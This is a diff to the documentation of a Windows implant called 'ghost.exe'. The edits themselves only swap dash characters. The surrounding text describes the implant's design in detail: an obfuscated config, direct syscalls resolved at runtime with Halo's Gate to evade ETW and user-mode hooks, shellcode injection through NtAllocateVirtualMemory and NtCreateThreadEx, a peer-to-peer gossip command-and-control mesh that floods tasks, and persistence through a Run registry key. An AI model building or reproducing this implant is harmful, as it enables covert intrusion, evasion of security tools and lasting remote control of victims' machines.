@@ -32,7 +32,7 @@ ghost.exe --op <ip> <port> "shellcode:<base64>"
 ```
 
 Dependencies: `python3` + `cryptography` (in `/root/globe/bin/venv`), and a Go
-toolchain `>= 1.20` (crypto/ecdh) — validated with **go1.23.4 linux/amd64**
+toolchain `>= 1.20` (crypto/ecdh) - validated with **go1.23.4 linux/amd64**
 cross-compiling to `windows/amd64`.
 
 ---
@@ -166,7 +166,7 @@ maskOf() = sha256("ghost//2026//config")   // deterministic, matches Python side
 ```
 The XOR mask is computed identically on the Python (generator) side and the Go
 side. If they diverge, de-obfuscation silently fails and the implant uses the
-argv override — so a mis-match is survivable via argv but not silent.
+argv override - so a mis-match is survivable via argv but not silent.
 
 ---
 
@@ -193,16 +193,16 @@ is a multiple of 16 so that at the `SYSCALL` the stack is 16-byte aligned and th
 stack args land inside the stub's own frame (no push/pop alignment juggling).
 
 `syscalls_amd64.s` provides three arities:
-- `sysCall5` — for `NtWriteVirtualMemory`, `NtProtectVirtualMemory`
-- `sysCall6` — for `NtAllocateVirtualMemory`
-- `sysCall11` — for `NtCreateThreadEx`
+- `sysCall5` - for `NtWriteVirtualMemory`, `NtProtectVirtualMemory`
+- `sysCall6` - for `NtAllocateVirtualMemory`
+- `sysCall11` - for `NtCreateThreadEx`
 
 Go convention note: a function declared `func sysCallN(ssn uint16, a1..aN uintptr)
 uintptr` and defined only in assembly is reached via Go's amd64 ABI0 wrapper, so
 all args plus the return slot are addressed relative to `FP` at fixed offsets
 (`ssn+0`, `a1+8`, ..., `ret+8N+8`).
 
-### 6.2 SSN resolver (Halo's Gate) — `getSSN`, `hashName`, `plausibleSSN`
+### 6.2 SSN resolver (Halo's Gate) - `getSSN`, `hashName`, `plausibleSSN`
 
 SSNs are **not** baked/hardcoded because they drift between builds. Instead the
 implant locates each API's number at runtime by walking `ntdll`'s export table:
@@ -238,7 +238,7 @@ on purpose** (verified against the j00ru tables, XP SP1 → Win11 25H2):
 > Baking only the modern band would make the implant **reject valid SSNs on old
 > targets** and injection would fail silently.
 
-### 6.3 Shellcode injection — `injectShellcode`, `ntCurrentProcess`
+### 6.3 Shellcode injection - `injectShellcode`, `ntCurrentProcess`
 
 Performs a classic _Allocate → Write → Protect → Thread_ sequence entirely
 through the resolved SSNs (no user-land stubs, so ETW/user hooks on those ntdll
@@ -254,10 +254,10 @@ injectShellcode(sc)
   └─ NtCreateThreadEx(&hThread, GENERIC_ALL, nil, cur, base, 0, 0,0,0,0, nil) // 11-arg
 ```
 `ntCurrentProcess()` returns `0xFFFF...FFFF` (the `-1` pseudo-handle). Every step
-checks the returned NTSTATUS and returns a real error on failure — **success is
+checks the returned NTSTATUS and returns a real error on failure - **success is
 never fabricated**.
 
-### 6.4 P2P gossip-mesh C2 — `GossipMesh`
+### 6.4 P2P gossip-mesh C2 - `GossipMesh`
 
 A decentralized mesh in which every node talks to its neighbors; a task injected
 anywhere floods the whole mesh (bounded by `TTL`).
@@ -280,7 +280,7 @@ anywhere floods the whole mesh (bounded by `TTL`).
 `processMessage` handles `task` (with a real `shellcode:` injector branch) and
 `ping`; unknown types are ignored.
 
-### 6.5 Persistence — `persist.ps1`
+### 6.5 Persistence - `persist.ps1`
 
 Drops `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `ATLASRefresh` →
 `C:\Users\Public\ghost.exe`. Matched primitive: a GUI-subsystem EXE (the old
